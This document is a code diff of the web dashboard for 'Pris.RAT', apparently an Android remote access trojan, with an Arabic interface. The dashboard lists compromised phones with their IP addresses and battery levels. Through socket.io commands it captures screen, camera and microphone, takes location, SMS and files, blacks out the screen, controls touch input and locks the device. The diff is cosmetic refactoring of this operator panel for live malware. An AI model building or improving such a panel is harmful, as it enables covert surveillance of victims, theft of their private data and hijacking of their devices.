@@ -6,141 +6,75 @@
 <title>Pris.RAT - Dashboard</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-body {
-  background: #0a0a0f; color: #fff;
-  min-height: 100vh; padding: 20px;
-}
+body { background: #0a0a0f; color: #fff; min-height: 100vh; padding: 20px; }
 .header {
   display: flex; justify-content: space-between; align-items: center;
   padding: 15px 20px; background: rgba(20,20,25,0.9);
   border: 2px solid #ff0033; border-radius: 12px;
   margin-bottom: 20px;
-  box-shadow: 0 0 20px rgba(255,0,51,0.3);
 }
 .header h1 { color: #fff; font-size: 22px; }
 .header h1 span { color: #ff0033; }
-.header .status {
-  display: flex; align-items: center; gap: 8px;
-  color: #0f0; font-size: 13px;
-}
-.dot {
-  width: 10px; height: 10px; border-radius: 50%;
-  background: #0f0; box-shadow: 0 0 10px #0f0;
-  animation: pulse 2s infinite;
-}
-@keyframes pulse {
-  0%,100% { opacity: 1; }
-  50% { opacity: 0.4; }
-}
-.stats {
-  display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-  gap: 15px; margin-bottom: 20px;
-}
+.logout { background: #333; color: #fff; padding: 8px 16px; border-radius: 8px; text-decoration: none; font-size: 13px; }
+.stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
 .stat-card {
   background: rgba(20,20,25,0.9);
   border: 2px solid #333; border-radius: 12px;
   padding: 20px; text-align: center;
-  transition: all 0.3s;
 }
-.stat-card:hover { border-color: #ff0033; }
 .stat-card .num { font-size: 32px; color: #ff0033; font-weight: bold; }
 .stat-card .label { color: #888; font-size: 13px; margin-top: 5px; }
-.section-title {
-  color: #fff; font-size: 18px; margin: 20px 0 10px;
-  padding-right: 10px; border-right: 4px solid #ff0033;
-}
-.device-list {
-  display: flex; flex-direction: column; gap: 12px;
-}
+.section-title { color: #fff; font-size: 18px; margin: 20px 0 10px; padding-right: 10px; border-right: 4px solid #ff0033; }
+.device-list { display: flex; flex-direction: column; gap: 12px; }
 .device-card {
   background: rgba(20,20,25,0.9);
   border: 2px solid #333; border-radius: 12px;
   padding: 15px 20px;
   display: flex; justify-content: space-between; align-items: center;
-  transition: all 0.3s; cursor: pointer;
 }
-.device-card:hover {
-  border-color: #ff0033;
-  box-shadow: 0 0 20px rgba(255,0,51,0.3);
-  transform: translateX(-5px);
-}
-.device-info { flex: 1; }
+.device-card.online { border-color: #0f0; }
 .device-info .name { font-size: 16px; color: #fff; font-weight: bold; }
-.device-info .meta {
-  font-size: 12px; color: #888; margin-top: 5px;
-  display: flex; gap: 15px;
-}
-.device-status {
-  padding: 5px 12px; border-radius: 20px;
-  font-size: 12px; font-weight: bold;
-}
+.device-info .meta { font-size: 12px; color: #888; margin-top: 5px; }
+.device-status { padding: 5px 12px; border-radius: 20px; font-size: 12px; }
 .status-online { background: rgba(0,255,0,0.15); color: #0f0; border: 1px solid #0f0; }
 .status-offline { background: rgba(255,0,0,0.15); color: #f00; border: 1px solid #f00; }
-.empty {
-  text-align: center; padding: 60px 20px;
-  color: #666; font-size: 16px;
-}
+.empty { text-align: center; padding: 60px 20px; color: #666; }
 .controls {
   display: grid;
   grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
   gap: 12px; margin-top: 20px;
 }
 .ctrl-btn {
-  background: linear-gradient(135deg, rgba(255,0,51,0.1), rgba(153,0,0,0.1));
+  background: rgba(255,0,51,0.1);
   border: 2px solid #ff0033;
   border-radius: 10px;
   padding: 15px;
   color: #fff; font-size: 14px; font-weight: bold;
-  cursor: pointer; transition: all 0.3s;
-  display: flex; flex-direction: column;
-  align-items: center; gap: 8px;
+  cursor: pointer; text-align: center;
 }
-.ctrl-btn:hover {
-  background: linear-gradient(135deg, rgba(255,0,51,0.3), rgba(153,0,0,0.3));
-  box-shadow: 0 0 20px rgba(255,0,51,0.5);
-}
-.ctrl-btn .ico { font-size: 24px; }
-.logout {
-  background: #333; color: #fff;
-  padding: 8px 16px; border-radius: 8px;
-  text-decoration: none; font-size: 13px;
-}
+.ctrl-btn:hover { background: rgba(255,0,51,0.3); }
 </style>
 </head>
 <body>
 <div class="header">
   <h1>Pris.<span>RAT</span></h1>
-  <div class="status"><div class="dot"></div> Server Online</div>
   <a href="/logout" class="logout">خروج</a>
 </div>
 
 <div class="stats">
-  <div class="stat-card">
-    <div class="num" id="total">{{ total }}</div>
-    <div class="label">إجمالي الأجهزة</div>
-  </div>
-  <div class="stat-card">
-    <div class="num" id="online">{{ online }}</div>
-    <div class="label">متصل</div>
-  </div>
-  <div class="stat-card">
-    <div class="num" id="offline">{{ offline }}</div>
-    <div class="label">غير متصل</div>
-  </div>
+  <div class="stat-card"><div class="num">{{ total }}</div><div class="label">إجمالي الأجهزة</div></div>
+  <div class="stat-card"><div class="num">{{ online }}</div><div class="label">متصل</div></div>
+  <div class="stat-card"><div class="num">{{ offline }}</div><div class="label">غير متصل</div></div>
 </div>
 
 <div class="section-title">📱 الأجهزة المتصلة</div>
 <div class="device-list" id="devices">
   {% if devices %}
     {% for d in devices %}
-    <div class="device-card" onclick="selectDevice('{{ d.id }}')">
+    <div class="device-card {% if d.online %}online{% endif %}" onclick="selectDevice('{{ d.id }}')">
       <div class="device-info">
         <div class="name">{{ d.model }}</div>
-        <div class="meta">
-          <span>Android {{ d.android }}</span>
-          <span>🔋 {{ d.battery }}%</span>
-          <span>{{ d.ip }}</span>
-        </div>
+        <div class="meta">Android {{ d.android }} | 🔋 {{ d.battery }}% | {{ d.ip }}</div>
       </div>
       <div class="device-status {% if d.online %}status-online{% else %}status-offline{% endif %}">
         {% if d.online %}متصل{% else %}غير متصل{% endif %}
@@ -154,41 +88,31 @@ body {
 
 <div class="section-title">⚡ التحكم السريع</div>
 <div class="controls">
-  <div class="ctrl-btn" onclick="cmd('screen')"><span class="ico">📸</span>شاشة</div>
-  <div class="ctrl-btn" onclick="cmd('camera')"><span class="ico">🎥</span>كاميرا</div>
-  <div class="ctrl-btn" onclick="cmd('mic')"><span class="ico">🎤</span>مايك</div>
-  <div class="ctrl-btn" onclick="cmd('location')"><span class="ico">📍</span>موقع</div>
-  <div class="ctrl-btn" onclick="cmd('sms')"><span class="ico">💬</span>رسائل</div>
-  <div class="ctrl-btn" onclick="cmd('files')"><span class="ico">📁</span>ملفات</div>
-  <div class="ctrl-btn" onclick="cmd('blackout')"><span class="ico">⬛</span>شاشة سوداء</div>
-  <div class="ctrl-btn" onclick="cmd('touch')"><span class="ico">🖱️</span>تحكم لمس</div>
-  <div class="ctrl-btn" onclick="cmd('lock')"><span class="ico">🔒</span>قفل</div>
+  <div class="ctrl-btn" onclick="cmd('screen')">📸 شاشة</div>
+  <div class="ctrl-btn" onclick="cmd('camera')">🎥 كاميرا</div>
+  <div class="ctrl-btn" onclick="cmd('mic')">🎤 مايك</div>
+  <div class="ctrl-btn" onclick="cmd('location')">📍 موقع</div>
+  <div class="ctrl-btn" onclick="cmd('sms')">💬 رسائل</div>
+  <div class="ctrl-btn" onclick="cmd('files')">📁 ملفات</div>
+  <div class="ctrl-btn" onclick="cmd('blackout')">⬛ شاشة سوداء</div>
+  <div class="ctrl-btn" onclick="cmd('touch')">🖱️ تحكم لمس</div>
+  <div class="ctrl-btn" onclick="cmd('lock')">🔒 قفل</div>
 </div>
 
 <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 <script>
 let selectedDevice = null;
 const socket = io();
-
-socket.on('devices_update', (data) => {
-  location.reload();
-});
+socket.on('devices_update', () => location.reload());
 
 function selectDevice(id) {
   selectedDevice = id;
-  sessionStorage.setItem('selected', id);
   alert('تم اختيار الجهاز: ' + id);
 }
 
 function cmd(action) {
-  if (!selectedDevice) {
-    alert('اختر جهاز أولاً');
-    return;
-  }
-  socket.emit('send_command', {
-    target: selectedDevice,
-    action: action
-  });
+  if (!selectedDevice) { alert('اختر جهاز أولاً'); return; }
+  socket.emit('send_command', { target: selectedDevice, action: action });
   alert('تم إرسال الأمر: ' + action);
 }
 </script>
